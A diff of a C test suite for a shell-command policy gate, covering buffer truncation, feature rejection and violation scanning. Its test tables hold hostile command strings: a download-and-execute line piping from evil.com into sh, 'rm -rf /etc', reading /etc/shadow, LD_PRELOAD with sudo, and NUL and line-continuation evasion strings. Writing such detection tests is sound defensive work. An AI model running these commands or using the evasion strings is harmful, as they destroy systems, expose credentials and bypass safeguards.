   ASSERT_SG_OK(sg_gate_remove_allow_cpl(gate, pattern));
   ASSERT_EQ_UINT(sg_gate_allow_rule_count(gate), 0);
-  ASSERT_SG_OK(eval_cmd(gate, command, &result));
-  ASSERT(result.verdict == SG_VERDICT_UNDETERMINED);
-  ASSERT(result.subcommand_count == 1 &&
-         result.subcommands[0].netargv != NULL &&
-         result.subcommands[0].netargv_length == sizeof(expected_netargv) &&
-         memcmp(result.subcommands[0].netargv, expected_netargv,
-                sizeof(expected_netargv)) == 0);
+  ASSERT_EQ_INT(eval_cmd(gate, command, &result), SG_ERR_PARSE);
+  ASSERT_EQ_UINT(result.subcommand_count, 1);
+  sg_gate_free(gate);
+}
+
+TEST(ansi_nul_source_rejection) {
+  static const char *const rejected[] = {
+      "e$'val\\0x' 'printf bypass'",
+      "export $'POSIXLY_CORRECT\\0X'=1",
+      "printf $'a\\x00b'",
+      "printf $(printf $'a\\u0000b')",
+      "cat <<$'E\\0F'X\nbody\nEX\n",
+      "cat <<A <<$'E\\0F'X\nfirst\nA\nsecond\nEX\n",
+  };
+  sg_gate_t *gate = sg_gate_new();
+  ASSERT(gate != NULL);
+  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
+  for (size_t i = 0; i < sizeof(rejected) / sizeof(rejected[0]); i++) {
+    sg_result_t result = {0};
+    ASSERT_EQ_INT(eval_cmd(gate, rejected[i], &result), SG_ERR_PARSE);
+    ASSERT(result.verdict == SG_VERDICT_REJECT &&
+           result.subcommand_count == 1 &&
+           result.subcommands[0].verdict == SG_VERDICT_REJECT &&
+           result.subcommands[0].netargv == NULL);
+  }
   sg_gate_free(gate);
 }
 
@@ -3393,62 +4339,132 @@ TEST(buffer_contract_matrix) {
   ASSERT(feature_result.verdict == SG_VERDICT_UNDETERMINED);
   ASSERT_SG_OK(sg_gate_set_reject_mask(g, SG_REJECT_MASK_DEFAULT));
 
-  static const char *diagnostic_commands[] = {
-      "echo $(id)", "echo $(case value in x)", "echo 'unterminated"};
-  for (size_t i = 0;
-       i < sizeof(diagnostic_commands) / sizeof(diagnostic_commands[0]); i++) {
-    char buffer[4];
-    sg_result_t result;
-    ASSERT(sg_gate_evaluate(g, diagnostic_commands[i],
-                            strlen(diagnostic_commands[i]), buffer,
-                            sizeof(buffer), &result) == SG_ERR_TRUNC);
-    ASSERT(result.truncated);
-    ASSERT(result.verdict == SG_VERDICT_UNDETERMINED);
-    ASSERT(memchr(buffer, '\0', sizeof(buffer)) != NULL);
-  }
+  /* Early feature rejections run before workspace partitioning. The complete
+   * caller buffer is available even when the capacity was constructed with a
+   * deliberately tiny hypothetical graph-result prefix. */
+  size_t early_feature_buffer_size = eval_buffer_size_for_prefix(4);
+  size_t early_feature_prefix =
+      eval_result_prefix_size(early_feature_buffer_size);
+  ASSERT(early_feature_buffer_size != 0 && early_feature_prefix != 0);
+  ASSERT_SG_OK(sg_gate_set_reject_mask(g, SHELL_FEAT_VARS));
+  ASSERT(eval_with_prefix(g, "echo $VALUE", 4, &feature_result) == SG_OK);
+  ASSERT(!feature_result.truncated &&
+         feature_result.verdict == SG_VERDICT_REJECT &&
+         feature_result.deny_reason != NULL &&
+         strlen(feature_result.deny_reason) > 4 &&
+         result_fields_stay_in_prefix(&feature_result,
+                                      early_feature_buffer_size) &&
+         !result_fields_stay_in_prefix(&feature_result, early_feature_prefix));
+  ASSERT_SG_OK(sg_gate_set_reject_mask(g, SG_REJECT_MASK_DEFAULT));
+
+  /* A syntactically valid evaluation cannot silently allocate resolver state
+   * when the caller left room only for diagnostics. */
+  char workspace_too_small[SG_DIAGNOSTIC_BUF_MIN] = {0};
+  sg_result_t workspace_result;
+  ASSERT(sg_gate_evaluate(g, "ls", 2, workspace_too_small,
+                          sizeof(workspace_too_small),
+                          &workspace_result) == SG_ERR_MEMORY);
+  ASSERT(workspace_result.verdict == SG_VERDICT_UNDETERMINED);
+  ASSERT(!workspace_result.truncated);
+  ASSERT_STR(workspace_result.deny_reason, "depgraph workspace unavailable");
+
+  /* The resolver tail also cannot consume the entire caller buffer: the
+   * evaluator needs at least one byte in its result prefix.  Align this test
+   * buffer explicitly so its exact size reaches that boundary on every
+   * supported allocator. */
+  size_t workspace_size = 0;
+  size_t workspace_alignment = shell_dep_workspace_alignment();
+  ASSERT(shell_dep_workspace_size(NULL, &workspace_size));
+  ASSERT(workspace_alignment != 0);
+  ASSERT(workspace_size <= SIZE_MAX - workspace_alignment);
+  char *exact_workspace_raw = malloc(workspace_size + workspace_alignment);
+  ASSERT(exact_workspace_raw != NULL);
+  uintptr_t raw_address = (uintptr_t)(void *)exact_workspace_raw;
+  uintptr_t remainder = raw_address % workspace_alignment;
+  char *exact_workspace =
+      exact_workspace_raw +
+      (remainder == 0 ? 0 : workspace_alignment - remainder);
+  ASSERT(sg_gate_evaluate(g, "ls", 2, exact_workspace, workspace_size,
+                          &workspace_result) == SG_ERR_MEMORY);
+  ASSERT(workspace_result.verdict == SG_VERDICT_UNDETERMINED);
+  ASSERT(!workspace_result.truncated);
+  ASSERT_STR(workspace_result.deny_reason, "depgraph workspace unavailable");
+  free(exact_workspace_raw);
+
+  /* Failed parsing happens before the depgraph workspace is partitioned.  A
+   * caller that cannot retain even its short diagnostic still gets an explicit
+   * undetermined result, whether parsing failed before or after a command. */
+  char one_byte_buffer[1];
+  ASSERT(sg_gate_evaluate(g, "ls", 2, one_byte_buffer, sizeof(one_byte_buffer),
+                          &workspace_result) == SG_ERR_MEMORY);
+  ASSERT(workspace_result.truncated);
+  ASSERT(workspace_result.verdict == SG_VERDICT_UNDETERMINED);
+  ASSERT(sg_gate_evaluate(g, "'", 1, one_byte_buffer, sizeof(one_byte_buffer),
+                          &workspace_result) == SG_ERR_TRUNC);
+  ASSERT(workspace_result.truncated);
+  ASSERT(workspace_result.verdict == SG_VERDICT_UNDETERMINED);
+  ASSERT(sg_gate_evaluate(g, "ls; '", strlen("ls; '"), one_byte_buffer,
+                          sizeof(one_byte_buffer),
+                          &workspace_result) == SG_ERR_TRUNC);
+  ASSERT(workspace_result.truncated);
+  ASSERT(workspace_result.verdict == SG_VERDICT_UNDETERMINED);
+  ASSERT(sg_gate_evaluate(g, "{ echo }", strlen("{ echo }"), one_byte_buffer,
+                          sizeof(one_byte_buffer),
+                          &workspace_result) == SG_ERR_TRUNC);
+  ASSERT(workspace_result.truncated);
+  ASSERT(workspace_result.verdict == SG_VERDICT_UNDETERMINED);
+
+  /* A syntactically valid command reaches the partitioned writer, so a tiny
+   * result prefix still fails closed after the resolver workspace is carved
+   * from the tail. Syntax errors above that stage intentionally retain the
+   * full diagnostic buffer and return SG_ERR_PARSE instead. */
+  sg_result_t diagnostic_result;
+  ASSERT(eval_with_prefix(g, "echo $(id)", 4, &diagnostic_result) ==
+         SG_ERR_TRUNC);
+  ASSERT(diagnostic_result.truncated);
+  ASSERT(diagnostic_result.verdict == SG_VERDICT_UNDETERMINED);
+
+  /* A graph-only rejection uses the same partitioned result prefix.  It must
+   * not surface a partial rejection reason as a definite policy decision. */
+  ASSERT_SG_OK(sg_gate_set_reject_mask(g, 0));
+  ASSERT(eval_with_prefix(g, "printf x >&$missing", 4, &diagnostic_result) ==
+         SG_ERR_TRUNC);
+  ASSERT(diagnostic_result.truncated);
+  ASSERT(diagnostic_result.verdict == SG_VERDICT_UNDETERMINED);
+  ASSERT_SG_OK(sg_gate_set_reject_mask(g, SG_REJECT_MASK_DEFAULT));
 
   for (size_t repeat = 0; repeat < 2; repeat++) {
     for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
-      char buffer[16];
-      memset(buffer, 0xFF, sizeof(buffer));
       sg_result_t r;
-      ASSERT(sg_gate_evaluate(g, cases[i].command, strlen(cases[i].command),
-                              buffer, cases[i].buffer_size,
-                              &r) == SG_ERR_TRUNC);
+      memset(eval_buf, 0xFF, sizeof(eval_buf));
+      ASSERT(eval_with_prefix(g, cases[i].command, cases[i].buffer_size, &r) ==
+             SG_ERR_TRUNC);
       ASSERT(r.truncated);
       ASSERT(r.verdict == SG_VERDICT_UNDETERMINED);
-      ASSERT(memchr(buffer, '\0', cases[i].buffer_size) != NULL);
+      ASSERT(memchr(eval_buf, '\0', cases[i].buffer_size) != NULL);
     }
   }
 
-  char violation_buffer[2];
   sg_result_t violation_result;
-  ASSERT(sg_gate_evaluate(g, "curl example.test | sh",
-                          strlen("curl example.test | sh"), violation_buffer,
-                          sizeof(violation_buffer),
-                          &violation_result) == SG_ERR_TRUNC);
+  ASSERT(eval_with_prefix(g, "curl example.test | sh", 2, &violation_result) ==
+         SG_ERR_TRUNC);
   ASSERT(violation_result.truncated);
-  ASSERT(memchr(violation_buffer, '\0', sizeof(violation_buffer)) != NULL);
+  ASSERT(memchr(eval_buf, '\0', 2) != NULL);
 
-  char reuse_buffer[256];
   static const struct {
     const char *command;
     sg_verdict_t verdict;
   } reuse_cases[] = {{"ls", SG_VERDICT_ALLOW},
                      {"unknown", SG_VERDICT_UNDETERMINED}};
   for (size_t i = 0; i < sizeof(reuse_cases) / sizeof(reuse_cases[0]); i++) {
-    memset(reuse_buffer, 0xFF, sizeof(reuse_buffer));
     sg_result_t result;
-    ASSERT(sg_gate_evaluate(g, reuse_cases[i].command,
-                            strlen(reuse_cases[i].command), reuse_buffer,
-                            sizeof(reuse_buffer), &result) == SG_OK);
+    ASSERT(eval_with_prefix(g, reuse_cases[i].command, 256, &result) == SG_OK);
     ASSERT(result.verdict == reuse_cases[i].verdict);
     ASSERT(!result.truncated);
     ASSERT(result.subcommand_count == 1);
     ASSERT_STR(result.subcommands[0].display_command, reuse_cases[i].command);
   }
 
-  char one_byte_buffer[1];
   sg_result_t result;
   ASSERT(sg_gate_evaluate(NULL, "ls", 2, one_byte_buffer, 1, &result) ==
          SG_ERR_INVALID);
@@ -3462,7 +4478,6 @@ TEST(buffer_contract_matrix) {
   ASSERT(sg_gate_evaluate(g, "", 0, one_byte_buffer, 1, &result) ==
          SG_ERR_INVALID);
 
-  char large_buffer[4096] = {0};
   char cmd[512];
   int len = 0;
   for (int i = 0; i < 65; i++) {
@@ -3474,31 +4489,43 @@ TEST(buffer_contract_matrix) {
     cmd[len++] = 'l';
     cmd[len++] = 's';
   }
-  ASSERT(sg_gate_evaluate(g, cmd, (size_t)len, large_buffer,
-                          sizeof(large_buffer), &result) == SG_ERR_TRUNC);
+  ASSERT(eval_with_prefix(g, cmd, 4096, &result) == SG_ERR_TRUNC);
   ASSERT(result.subcommand_count == SG_MAX_SUBCOMMAND_RESULTS);
   ASSERT(result.truncated);
   ASSERT(result.subcommand_truncated);
 
-  char termination_buffer[32];
-  memset(termination_buffer, 0xFF, sizeof(termination_buffer));
-  ASSERT(sg_gate_evaluate(g, "ls", 2, termination_buffer,
-                          sizeof(termination_buffer), &result) == SG_OK);
+  size_t graph_buffer_size = eval_buffer_size_for_prefix(32);
+  size_t graph_result_prefix = eval_result_prefix_size(graph_buffer_size);
+  ASSERT(graph_buffer_size != 0 && graph_result_prefix != 0);
+  memset(eval_buf, 0xFF, sizeof(eval_buf));
+  ASSERT(eval_with_prefix(g, "ls", 32, &result) == SG_OK);
   ASSERT(!result.truncated);
   ASSERT_STR(result.subcommands[0].display_command, "ls");
-  ASSERT(memchr(termination_buffer, '\0', sizeof(termination_buffer)) != NULL);
+  ASSERT(result.subcommands[0].netargv != NULL &&
+         (uintptr_t)(void *)result.subcommands[0].display_command >=
+             (uintptr_t)(void *)eval_buf &&
+         (size_t)((uintptr_t)(void *)result.subcommands[0].display_command -
+                  (uintptr_t)(void *)eval_buf) < graph_result_prefix &&
+         (uintptr_t)(void *)result.subcommands[0].netargv >=
+             (uintptr_t)(void *)eval_buf &&
+         (size_t)((uintptr_t)(void *)result.subcommands[0].netargv -
+                  (uintptr_t)(void *)eval_buf) <= graph_result_prefix &&
+         result.subcommands[0].netargv_length <=
+             graph_result_prefix -
+                 (size_t)((uintptr_t)(void *)result.subcommands[0].netargv -
+                          (uintptr_t)(void *)eval_buf));
+  ASSERT(memchr(eval_buf, '\0', 32) != NULL);
 
   ASSERT_SG_OK(sg_gate_enable_anomaly(g, 5.0, NULL));
   static const char anomaly_command[] =
       "ls -la /tmp ; cd /var/log ; pwd ; cat somefile.txt";
-  char anomaly_small[16];
-  memset(anomaly_small, 0xFF, sizeof(anomaly_small));
-  ASSERT(sg_gate_evaluate(g, anomaly_command, strlen(anomaly_command),
-                          anomaly_small, sizeof(anomaly_small),
-                          &result) == SG_ERR_TRUNC);
+  size_t anomaly_vocab_before = sg_gate_anomaly_vocab_size(g);
+  memset(eval_buf, 0xFF, sizeof(eval_buf));
+  ASSERT(eval_with_prefix(g, anomaly_command, 16, &result) == SG_ERR_TRUNC);
   ASSERT(result.truncated);
   ASSERT(result.verdict == SG_VERDICT_UNDETERMINED);
-  ASSERT(memchr(anomaly_small, '\0', sizeof(anomaly_small)) != NULL);
+  ASSERT_EQ_UINT(sg_gate_anomaly_vocab_size(g), anomaly_vocab_before);
+  ASSERT(memchr(eval_buf, '\0', 16) != NULL);
 
   size_t hint = sg_gate_evaluate_size_hint(strlen(anomaly_command));
   char *hint_buffer = malloc(hint);
@@ -3506,10 +4533,146 @@ TEST(buffer_contract_matrix) {
   ASSERT(sg_gate_evaluate(g, anomaly_command, strlen(anomaly_command),
                           hint_buffer, hint, &result) == SG_OK);
   ASSERT(!result.truncated);
+  /* A truncated attempt must be a complete no-op for anomaly learning. The
+   * successful retry therefore has the same model and pre-update score as one
+   * complete evaluation on a fresh equivalent gate. */
+  sg_gate_t *retry_reference = gate_with_rules(rules, 3);
+  ASSERT(retry_reference != NULL);
+  ASSERT_SG_OK(sg_gate_add_deny_cpl(retry_reference, "rm"));
+  ASSERT_SG_OK(sg_gate_enable_anomaly(retry_reference, 5.0, NULL));
+  char *reference_buffer = malloc(hint);
+  ASSERT(reference_buffer != NULL);
+  sg_result_t reference_result;
+  ASSERT(sg_gate_evaluate(retry_reference, anomaly_command,
+                          strlen(anomaly_command), reference_buffer, hint,
+                          &reference_result) == SG_OK);
+  ASSERT_EQ_UINT(sg_gate_anomaly_vocab_size(g),
+                 sg_gate_anomaly_vocab_size(retry_reference));
+  sg_result_t retry_probe, reference_probe;
+  ASSERT_SG_OK(eval_cmd(g, "printf unique retry probe", &retry_probe));
+  ASSERT_SG_OK(
+      eval_cmd(retry_reference, "printf unique retry probe", &reference_probe));
+  ASSERT(fabs(retry_probe.anomaly_score - reference_probe.anomaly_score) <
+         1e-12);
+  ASSERT(fabs(retry_probe.anomaly_score_raw -
+              reference_probe.anomaly_score_raw) < 1e-12);
+  ASSERT(fabs(retry_probe.anomaly_score_type -
+              reference_probe.anomaly_score_type) < 1e-12);
+  free(reference_buffer);
+  sg_gate_free(retry_reference);
   free(hint_buffer);
+  char *misaligned_hint_buffer = malloc(hint + 1);
+  ASSERT(misaligned_hint_buffer != NULL);
+  ASSERT(sg_gate_evaluate(g, anomaly_command, strlen(anomaly_command),
+                          misaligned_hint_buffer + 1, hint, &result) == SG_OK);
+  ASSERT(!result.truncated);
+  free(misaligned_hint_buffer);
   ASSERT_SG_OK(eval_cmd(g, anomaly_command, &result));
   ASSERT(!result.truncated);
+
+  /* Nested substitutions can make the rendered stage list grow faster than
+   * the source itself. The public hint is intentionally advisory, and a
+   * truncation must remain safe to retry without learning a partial record. */
+  char nested_command[1024] = "echo nested";
+  for (size_t depth = 0; depth < 16; depth++) {
+    char wrapped[sizeof(nested_command)];
+    int written = snprintf(wrapped, sizeof(wrapped), "printf '%%s' \"$(%s)\"",
+                           nested_command);
+    ASSERT(written > 0 && (size_t)written < sizeof(wrapped));
+    memcpy(nested_command, wrapped, (size_t)written + 1);
+  }
+  sg_gate_t *nested_gate = sg_gate_new();
+  ASSERT(nested_gate != NULL);
+  ASSERT_SG_OK(sg_gate_enable_anomaly(nested_gate, 5.0, NULL));
+  size_t nested_hint = sg_gate_evaluate_size_hint(strlen(nested_command));
+  ASSERT(nested_hint != SIZE_MAX);
+  char *nested_buffer = malloc(nested_hint);
+  ASSERT(nested_buffer != NULL);
+  sg_result_t nested_result;
+  ASSERT(sg_gate_evaluate(nested_gate, nested_command, strlen(nested_command),
+                          nested_buffer, nested_hint,
+                          &nested_result) == SG_ERR_TRUNC);
+  ASSERT(nested_result.truncated && !nested_result.subcommand_truncated);
+  ASSERT_EQ_UINT(sg_gate_anomaly_vocab_size(nested_gate), 0);
+  char *nested_grown = realloc(nested_buffer, nested_hint * 2);
+  ASSERT(nested_grown != NULL);
+  nested_buffer = nested_grown;
+  ASSERT(sg_gate_evaluate(nested_gate, nested_command, strlen(nested_command),
+                          nested_buffer, nested_hint * 2,
+                          &nested_result) == SG_OK);
+  ASSERT(sg_gate_anomaly_vocab_size(nested_gate) > 0);
+  free(nested_buffer);
+  sg_gate_free(nested_gate);
   sg_gate_free(g);
+}
+
+TEST(graph_result_fields_stay_out_of_workspace) {
+  static const char *const allow_rules[] = {"ls", "cat #path", "echo *"};
+  const size_t requested_prefix = 2048;
+  size_t buffer_size = eval_buffer_size_for_prefix(requested_prefix);
+  size_t result_prefix = eval_result_prefix_size(buffer_size);
+  ASSERT(buffer_size != 0 && result_prefix >= requested_prefix);
+
+  sg_gate_t *gate = gate_with_rules(allow_rules, sizeof(allow_rules) /
+                                                     sizeof(allow_rules[0]));
+  ASSERT(gate != NULL);
+  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
+  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
+  ASSERT_SG_OK(sg_gate_add_deny_cpl(gate, "blocked"));
+  sg_violation_config_t config;
+  sg_violation_config_default(&config);
+  config.sensitive_write_paths[0] = "/workspace/result-prefix";
+  config.sensitive_write_path_count = 1;
+  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
+
+  sg_result_t result = {0};
+  ASSERT(eval_with_prefix(gate, "ls", requested_prefix, &result) == SG_OK);
+  ASSERT(result.verdict == SG_VERDICT_ALLOW &&
+         result_fields_stay_in_prefix(&result, result_prefix));
+
+  ASSERT(eval_with_prefix(gate, "blocked", requested_prefix, &result) == SG_OK);
+  ASSERT(result.verdict == SG_VERDICT_DENY &&
+         result.subcommands[0].reject_reason != NULL &&
+         result_fields_stay_in_prefix(&result, result_prefix));
+
+  ASSERT(eval_with_prefix(gate, "echo data > /workspace/result-prefix",
+                          requested_prefix, &result) == SG_OK);
+  ASSERT(result.has_violations && result.violation_count > 0 &&
+         result_fields_stay_in_prefix(&result, result_prefix));
+
+  /* A graph-backed truncation may retain a useful command or violation
+   * prefix, but no public pointer may cross into the route workspace tail. */
+  bool saw_graph_truncation = false;
+  bool saw_retained_graph_result = false;
+  for (size_t prefix = 1; prefix <= 256; prefix++) {
+    size_t buffer_size = eval_buffer_size_for_prefix(prefix);
+    size_t result_prefix = eval_result_prefix_size(buffer_size);
+    ASSERT(buffer_size != 0 && result_prefix != 0);
+    sg_error_t error = eval_with_prefix(
+        gate, "echo data > /workspace/result-prefix", prefix, &result);
+    if (error != SG_ERR_TRUNC)
+      continue;
+    saw_graph_truncation = true;
+    ASSERT(result.truncated && result.verdict == SG_VERDICT_UNDETERMINED &&
+           result_fields_stay_in_prefix(&result, result_prefix));
+    saw_retained_graph_result =
+        saw_retained_graph_result || result.subcommand_count != 0 ||
+        result.violation_count != 0 || result.deny_reason != NULL;
+  }
+  ASSERT(saw_graph_truncation && saw_retained_graph_result);
+  sg_gate_free(gate);
+
+  const char *const suggestion_rules[] = {"lss"};
+  gate = gate_with_rules(suggestion_rules, sizeof(suggestion_rules) /
+                                               sizeof(suggestion_rules[0]));
+  ASSERT(gate != NULL);
+  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
+  ASSERT_SG_OK(sg_gate_set_suggestions(gate, true));
+  ASSERT(eval_with_prefix(gate, "ls", requested_prefix, &result) == SG_OK);
+  ASSERT(result.verdict == SG_VERDICT_UNDETERMINED &&
+         result.suggestion_count > 0 &&
+         result_fields_stay_in_prefix(&result, result_prefix));
+  sg_gate_free(gate);
 }
 
 TEST(final_diagnostic_truncation_fails_closed) {
@@ -3518,12 +4681,17 @@ TEST(final_diagnostic_truncation_fails_closed) {
   ASSERT(gate != NULL);
   ASSERT_SG_OK(sg_gate_set_suggestions(gate, true));
 
+  /* The first stage produces a retained suggestion; the long second stage
+   * makes a later diagnostic write exhaust selected result prefixes. */
+  static const char command[] =
+      "ls ; "
+      "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
+      "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";
   bool exercised = false;
-  for (size_t buffer_size = 1; buffer_size <= 64; buffer_size++) {
-    char buffer[64];
+  for (size_t buffer_size = 1; buffer_size <= 512;
+       buffer_size += buffer_size < 64 ? 1 : 8) {
     sg_result_t result;
-    sg_error_t error =
-        sg_gate_evaluate(gate, "ls", 2, buffer, buffer_size, &result);
+    sg_error_t error = eval_with_prefix(gate, command, buffer_size, &result);
     ASSERT(result.truncated == (error == SG_ERR_TRUNC));
     if (error == SG_ERR_TRUNC && result.suggestion_count > 0) {
       exercised = true;
@@ -3531,6 +4699,46 @@ TEST(final_diagnostic_truncation_fails_closed) {
     }
   }
   ASSERT(exercised);
+  sg_gate_free(gate);
+}
+
+/* Suggestions are separately rendered diagnostics.  Exercise two allow and
+ * two deny candidates through both the complete result and every useful
+ * short-prefix boundary: a truncated rendering must never retain a definite
+ * policy verdict, while a sufficiently large caller buffer retains each
+ * independently useful suggestion. */
+TEST(suggestion_streaming_buffer_contract) {
+  sg_gate_t *gate = sg_gate_new();
+  ASSERT(gate != NULL);
+  ASSERT_SG_OK(sg_gate_add_allow_cpl(gate, "cat #path"));
+  ASSERT_SG_OK(sg_gate_add_deny_cpl(gate, "rm #path"));
+  ASSERT_SG_OK(sg_gate_set_suggestions(gate, true));
+  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
+
+  static const char command[] = "cat /tmp/one /tmp/two; rm /tmp/one /tmp/two";
+  sg_result_t complete;
+  ASSERT_SG_OK(eval_cmd(gate, command, &complete));
+  ASSERT(complete.suggestion_count == 2);
+  ASSERT(complete.deny_suggestion_count == 2);
+  ASSERT(complete.suggestions[0] != NULL && complete.suggestions[1] != NULL);
+  ASSERT(complete.deny_suggestions[0] != NULL &&
+         complete.deny_suggestions[1] != NULL);
+
+  bool saw_truncation = false;
+  for (size_t prefix = 1; prefix <= 256; prefix++) {
+    sg_result_t result;
+    sg_error_t error = eval_with_prefix(gate, command, prefix, &result);
+    ASSERT(result.truncated == (error == SG_ERR_TRUNC));
+    if (error == SG_ERR_TRUNC) {
+      saw_truncation = true;
+      ASSERT(result.verdict == SG_VERDICT_UNDETERMINED);
+    } else {
+      ASSERT(error == SG_OK);
+      ASSERT(result.suggestion_count == 2);
+      ASSERT(result.deny_suggestion_count == 2);
+    }
+  }
+  ASSERT(saw_truncation);
   sg_gate_free(gate);
 }
 
@@ -3873,10 +5081,8 @@ TEST(expansion_bounds_matrix) {
   ASSERT_SG_OK(eval_cmd(expanded, "echo $VALUE", &result));
   ASSERT(!result.truncated);
   ASSERT(result.verdict == SG_VERDICT_ALLOW);
-  char too_small[4096] = {0};
-  ASSERT(sg_gate_evaluate(expanded, "echo $VALUE", strlen("echo $VALUE"),
-                          too_small, sizeof(too_small),
-                          &result) == SG_ERR_TRUNC);
+  ASSERT(eval_with_prefix(expanded, "echo $VALUE", 4096, &result) ==
+         SG_ERR_TRUNC);
   ASSERT(result.truncated);
   ASSERT(result.verdict == SG_VERDICT_UNDETERMINED);
   sg_gate_free(expanded);
@@ -3925,11 +5131,9 @@ TEST(truncation_cross_product_matrix) {
        true},
   };
   for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
-    char buffer[4096];
     sg_result_t result;
     sg_error_t error =
-        sg_gate_evaluate(gate, cases[i].command, strlen(cases[i].command),
-                         buffer, cases[i].buffer_size, &result);
+        eval_with_prefix(gate, cases[i].command, cases[i].buffer_size, &result);
     ASSERT(error == cases[i].expected_error);
     ASSERT(result.verdict == cases[i].expected_verdict);
     ASSERT(result.subcommand_count == cases[i].expected_count);
@@ -3942,10 +5146,8 @@ TEST(truncation_cross_product_matrix) {
   }
 
   ASSERT_SG_OK(sg_gate_set_expand_var_netargv(gate, expand_failed, NULL));
-  char buffer[4096];
   sg_result_t result;
-  ASSERT(sg_gate_evaluate(gate, "echo $VALUE", strlen("echo $VALUE"), buffer,
-                          sizeof(buffer), &result) == SG_ERR_EXPAND);
+  ASSERT(eval_with_prefix(gate, "echo $VALUE", 4096, &result) == SG_ERR_EXPAND);
   ASSERT(!result.truncated && result.verdict == SG_VERDICT_UNDETERMINED);
 
   char many_writes[2048] = {0};
@@ -3958,16 +5160,13 @@ TEST(truncation_cross_product_matrix) {
     used += (size_t)written;
   }
   ASSERT_SG_OK(sg_gate_set_expand_var_netargv(gate, NULL, NULL));
-  ASSERT(sg_gate_evaluate(gate, many_writes, used, buffer, sizeof(buffer),
-                          &result) == SG_OK);
+  ASSERT(eval_with_prefix(gate, many_writes, 4096, &result) == SG_OK);
   ASSERT(!result.truncated);
   ASSERT(result.violation_truncated);
   ASSERT(result.violation_count <= SG_MAX_VIOLATIONS);
   ASSERT(result.violation_dropped_count > 0);
   ASSERT(result.violation_type_flags == result.violation_type_flags);
-  char small_buffer[32];
-  ASSERT(sg_gate_evaluate(gate, many_writes, used, small_buffer,
-                          sizeof(small_buffer), &result) == SG_ERR_TRUNC);
+  ASSERT(eval_with_prefix(gate, many_writes, 32, &result) == SG_ERR_TRUNC);
   ASSERT(result.truncated && result.verdict == SG_VERDICT_UNDETERMINED);
   sg_gate_free(gate);
 }
@@ -3983,6 +5182,13 @@ TEST(reject_mask_feature_matrix) {
       {"if true", SHELL_FEAT_CONDITIONALS},
       {"case value", SHELL_FEAT_CASE},
       {"echo $(<file)", SHELL_FEAT_SUBSHELL_FILE},
+      {"echo $\\\n((1 + 2))", SHELL_FEAT_ARITH},
+      {"echo $\\\r\n(printf child)", SHELL_FEAT_SUBSHELL},
+      {"cat <\\\n(printf input)", SHELL_FEAT_PROCESS_SUB},
+      {"echo $\\\r\n'quoted'", SHELL_FEAT_ANSI_C_QUOTE},
+      {"printf %s @\\\n(one|two)", SHELL_FEAT_EXTGLOB},
+      {"printf %s {f\\\nd}>out", SHELL_FEAT_NAMED_FD},
+      {"printf x &\\\n>out", SHELL_FEAT_COMBINED_REDIRECT},
       {"echo data | cat", SHELL_FEAT_PIPELINE},
       {"cat <<EOF\nhello\nEOF", SHELL_FEAT_HEREDOC},
   };
@@ -3999,6 +5205,18 @@ TEST(reject_mask_feature_matrix) {
     ASSERT(result.subcommands[0].group_parent_index == -1);
     sg_gate_free(gate);
   }
+}
+
+TEST(default_reject_mask_catches_continued_arithmetic) {
+  sg_gate_t *gate = sg_gate_new();
+  ASSERT(gate != NULL);
+  ASSERT_SG_OK(sg_gate_add_allow_cpl(gate, "echo *"));
+
+  sg_result_t result = {0};
+  ASSERT_SG_OK(eval_cmd(gate, "echo $\\\n((1 + 2))", &result));
+  ASSERT(result.verdict == SG_VERDICT_REJECT);
+  ASSERT(result.subcommand_count == 1);
+  sg_gate_free(gate);
 }
 
 /* --- VIOLATION SCANNING --- */
@@ -4116,6 +5334,8 @@ TEST(violation_rule_matrix) {
        "badfile"},
       {"system removal", "rm -rf /etc", "rm /tmp/junk", SG_VIOL_REMOVE_SYSTEM,
        90, NULL},
+      {"path-qualified system removal", "/usr/bin/rm -rf /etc",
+       "/usr/bin/rmx -rf /etc", SG_VIOL_REMOVE_SYSTEM, 90, NULL},
       {"ANSI-C system removal", "rm -rf $'\\x2fetc'", "rm -rf $'\\x2ftmp'",
        SG_VIOL_REMOVE_SYSTEM, 90, NULL},
       {"privileged environment", "LD_PRELOAD=mal.so sudo ls", "FOO=bar ls",
@@ -4131,6 +5351,26 @@ TEST(violation_rule_matrix) {
       {"write/read after pipeline",
        "printf data | cat > /tmp/x; grep data /tmp/x", NULL,
        SG_VIOL_WRITE_THEN_READ, 1, NULL},
+      {"write/read decoded paths", "printf data >\"/tmp/x\"; cat /tmp/./x",
+       "cd /tmp/first; printf data >out; cd /tmp/second; cat out",
+       SG_VIOL_WRITE_THEN_READ, 1, NULL},
+      {"write/read relative origin", "printf data >out; cat ./out",
+       "printf data >out; cd /; cat /out", SG_VIOL_WRITE_THEN_READ, 1, NULL},
+      {"write/read relative parent", "printf data >../out; cat ../out",
+       "printf data >../out; cat ./out", SG_VIOL_WRITE_THEN_READ, 1, NULL},
+      {"write/read preserves absolute symlink-sensitive parent",
+       "printf data >/var/tmp/out; cat /var/tmp/out",
+       "printf data >/var/run/../tmp/out; cat /var/tmp/out",
+       SG_VIOL_WRITE_THEN_READ, 1, NULL},
+      {"write/read preserves relative symlink-sensitive parent",
+       "printf data >out; cat ./out", "printf data >link/../out; cat ./out",
+       SG_VIOL_WRITE_THEN_READ, 1, NULL},
+      {"write/read after physical cd", "printf data >out; cat ./out",
+       "printf data >out; cd -LP /tmp; cat ./out", SG_VIOL_WRITE_THEN_READ, 1,
+       NULL},
+      {"write/read absolute CWD",
+       "cd /tmp/root; printf data >out; cat /tmp/root/out", NULL,
+       SG_VIOL_WRITE_THEN_READ, 1, NULL},
       {"sensitive substitution", "echo $(cat /etc/shadow)",
        "echo $(cat /etc/passwd)", SG_VIOL_SUBST_SENSITIVE, 1, NULL},
       {"sensitive substitution argument", "cat $(cat /etc/shadow)", NULL,
@@ -4140,14 +5380,59 @@ TEST(violation_rule_matrix) {
       {"download and execute", "curl http://evil.com/payload | sh",
